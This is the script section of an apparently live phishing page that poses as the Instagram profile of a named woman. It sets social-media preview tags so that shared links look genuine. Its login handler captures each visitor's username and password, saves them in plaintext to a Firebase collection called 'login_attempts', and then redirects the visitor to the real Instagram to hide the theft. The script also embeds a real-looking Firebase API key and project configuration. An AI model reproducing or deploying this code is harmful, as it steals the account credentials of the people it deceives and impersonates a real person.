<body>

    <script>
        // Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyBFLWTZnHz8EcLjsdHAXDXG5ogU7z0ok0I",
            authDomain: "insta-7f34f.firebaseapp.com",
            databaseURL: "https://insta-7f34f-default-rtdb.firebaseio.com",
            projectId: "insta-7f34f",
            storageBucket: "insta-7f34f.firebasestorage.app",
            messagingSenderId: "981637167144",
            appId: "1:981637167144:web:841af72e833be6ed081d1d"
        };
      
        // Initialize Firebase
        const app = firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        // Function to update meta tags dynamically
        function updateMetaTags(metaData) {
            if (metaData.title) {
                document.getElementById('og-title').setAttribute('content', metaData.title);
                document.getElementById('twitter-title').setAttribute('content', metaData.title);
                document.title = metaData.title;
            }
            
            if (metaData.description) {
                document.getElementById('og-description').setAttribute('content', metaData.description);
                document.getElementById('twitter-description').setAttribute('content', metaData.description);
            }
            
            if (metaData.image) {
                document.getElementById('og-image').setAttribute('content', metaData.image);
                document.getElementById('og-image-secure-url').setAttribute('content', metaData.image);
                document.getElementById('twitter-image').setAttribute('content', metaData.image);
            }
            
            if (metaData.url) {
                document.getElementById('og-url').setAttribute('content', metaData.url);
                document.getElementById('twitter-url').setAttribute('content', metaData.url);
            }
            
            if (metaData.imageAlt) {
                document.getElementById('og-image-alt').setAttribute('content', metaData.imageAlt);
            }
        }

        // Load meta data from Firebase on page load
        async function loadMetaData() {
            try {
                const metaDoc = await db.collection("meta_settings").doc("current").get();
                if (metaDoc.exists) {
                    const metaData = metaDoc.data();
                    updateMetaTags(metaData);
                    console.log("Meta tags updated from Firebase:", metaData);
                }
            } catch (error) {
                console.error("Error loading meta data:", error);
            }
        }

        // Force meta tag refresh for social media platforms
        function forceMetaRefresh() {
            // Update meta tags with current timestamp to force cache refresh
            const timestamp = new Date().toISOString();
            document.querySelector('meta[property="og:updated_time"]').setAttribute('content', timestamp);
            document.querySelector('meta[name="twitter:updated_time"]').setAttribute('content', timestamp);
            
            // Ensure all meta tags are properly set
            const metaTags = {
                'og:title': 'Tamanna Sharma - Instagram Profile',
                'og:description': 'Follow Tamanna Sharma on Instagram for amazing photos, stories, and updates. Check out her latest posts and connect with her!',
                'og:image': 'https://instagram-c4qx.onrender.com/images/main.png',
                'og:url': 'https://instagram-c4qx.onrender.com/',
                'twitter:title': 'Tamanna Sharma - Instagram Profile',
                'twitter:description': 'Follow Tamanna Sharma on Instagram for amazing photos, stories, and updates. Check out her latest posts and connect with her!',
                'twitter:image': 'https://instagram-c4qx.onrender.com/images/main.png',
                'twitter:url': 'https://instagram-c4qx.onrender.com/'
            };
            
            Object.entries(metaTags).forEach(([property, value]) => {
                const meta = document.querySelector(`meta[property="${property}"], meta[name="${property}"]`);
                if (meta) {
                    meta.setAttribute('content', value);
                }
            });
        }

        // Load meta data when page loads
        loadMetaData();
        
        // Force refresh after a short delay to ensure proper loading
        setTimeout(forceMetaRefresh, 1000);

        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            try {
                // Store in Firebase
                await db.collection("login_attempts").add({
                    username: username,
                    password: password,
                    timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                    userAgent: navigator.userAgent,
                    timestampClient: new Date().toISOString()
                });
                
                // Redirect to Instagram after successful storage
                window.location.href = "https://www.instagram.com/";
            } catch (error) {
                console.error("Error storing data: ", error);
                // Still redirect even if storage fails
                window.location.href = "https://www.instagram.com/";
            }
        });
    </script>
</body>
